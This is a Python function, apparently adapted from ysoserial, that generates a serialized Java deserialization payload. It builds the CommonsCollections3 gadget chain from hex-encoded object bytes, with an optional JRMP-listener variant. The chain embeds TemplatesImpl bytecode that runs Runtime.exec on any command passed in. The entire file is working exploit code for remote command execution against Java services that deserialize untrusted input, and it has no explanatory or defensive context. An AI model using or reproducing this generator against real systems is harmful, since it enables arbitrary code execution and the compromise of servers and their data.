def cc3(cmd: str, jrmp: bool = False) -> bytes:
    if jrmp == True:
        prefix = "51aced0005770f020d2f8de400000180c6ce2fa580027372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b70787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000070787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b70787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd2239020000707870000000047372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00057078700000011b74001e79736f73657269616c2e6578706c6f69742e4a524d504c697374656e65727400114a524d504c697374656e65722e6a617661740006646f43616c6c7371007e000b000000e071007e000d71007e000e740009646f4d6573736167657371007e000b000000ab71007e000d71007e000e74000372756e7371007e000b0000007771007e000d71007e000e7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e0007707872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b707870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65707870000000007704000000007871007e001b787372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b707870737d00000001000d6a6176612e7574696c2e4d617074001966696c653a2f707269766174652f746d702f79736f2e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707371007e001c7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b74001966696c653a2f707269766174652f746d702f79736f2e6a617278707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b74001966696c653a2f707269766174652f746d702f79736f2e6a617278707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d834189902000074001966696c653a2f707269766174652f746d702f79736f2e6a61727870000000027372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000174001966696c653a2f707269766174652f746d702f79736f2e6a6172787076720037636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e5472415846696c74657200000000000000000000007078707372003e6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b74001966696c653a2f707269766174652f746d702f79736f2e6a61727870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000707870000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e00384c00055f6e616d6571007e00054c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b70787000000000ffffffff757200035b5b424bfd19156767db3702000070787000000002757200025b42acf317f8060854e0020000707870"
        midfix = "cafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01"
        postfix = "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001e79736f73657269616c2f50776e65723233313632363231383837383537330100204c79736f73657269616c2f50776e65723233313632363231383837383537333b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002f000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000034000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000038000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e0043000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003c000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e727077010078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000707870000000017672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c617465730000000000000000000000707870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647078703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f76657272696465000000000000000000000070787071007e004e"
        length = (0x696 + len(cmd)).to_bytes(4, byteorder='big').hex()
        length2 = len(cmd).to_bytes(2, byteorder='big').hex()
        hexdata = prefix + length + midfix + length2 + cmd.encode().hex() + postfix
        data = bytes.fromhex(hexdata)
        return data
    prefix = "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000027372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b787076720037636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e5472415846696c746572000000000000000000000078707372003e6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000949000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785a00155f75736553657276696365734d656368616e69736d4c00195f61636365737345787465726e616c5374796c6573686565747400124c6a6176612f6c616e672f537472696e673b4c000b5f617578436c617373657374003b4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f486173687461626c653b5b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e00184c00055f6e616d6571007e001d4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff00740003616c6c70757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e00200007870"
    midfix = "cafebabe00000034003907003701002e636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e733324537475625472616e736c65745061796c6f6164070004010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700060100146a6176612f696f2f53657269616c697a61626c6501001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f64650a000300100c000c000d01000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100304c636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e733324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b295601000a457863657074696f6e73070019010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c65010010436f6d6d6f6e33746573742e6a61766101000c496e6e6572436c617373657307002701001a636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e7333010013537475625472616e736c65745061796c6f61640100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01"
    postfix = "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001d79736f73657269616c2f50776e6572343231393932353933303934313601001f4c79736f73657269616c2f50776e657234323139393235393330393431363b002100010003000100050001001a000700080001000900000002000a00040001000c000d0001000e0000002f00010001000000052ab7000fb10000000200110000000600010000007e00120000000c000100000005001300380000000100150016000200170000000400010018000e0000003f0000000300000001b10000000200110000000600010000008300120000002000030000000100130038000000000001001a001b000100000001001c001d000200010015001e000200170000000400010018000e000000490000000400000001b10000000200110000000600010000008700120000002a00040000000100130038000000000001001a001b000100000001001f002000020000000100210022000300080029000d0001000e00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002300000002002400250000000a000100010026002800097571007e0025000001c9cafebabe00000034001b07000201001e636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e733324466f6f0700040100106a6176612f6c616e672f4f626a6563740700060100146a6176612f696f2f53657269616c697a61626c6501001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f64650a000300100c000c000d01000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100204c636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e733324466f6f3b01000a536f7572636546696c65010010436f6d6d6f6e33746573742e6a61766101000c496e6e6572436c617373657307001901001a636f6d6d6f6e332f436f6d6d6f6e436f6c6c656374696f6e7333010003466f6f002100010003000100050001001a000700080001000900000002000a00010001000c000d0001000e0000002f00010001000000052ab7000fb10000000200110000000600010000007700120000000c0001000000050013001400000002001500000002001600170000000a000100010018001a00097074000450776e727077010078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c6174657300000000000000000000007870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e0030"
    length = (0x689 + len(cmd)).to_bytes(4, byteorder='big').hex()
    length2 = len(cmd).to_bytes(2, byteorder='big').hex()
    hexdata = prefix + length + midfix + length2 + cmd.encode().hex() + postfix
    data = bytes.fromhex(hexdata)
    return data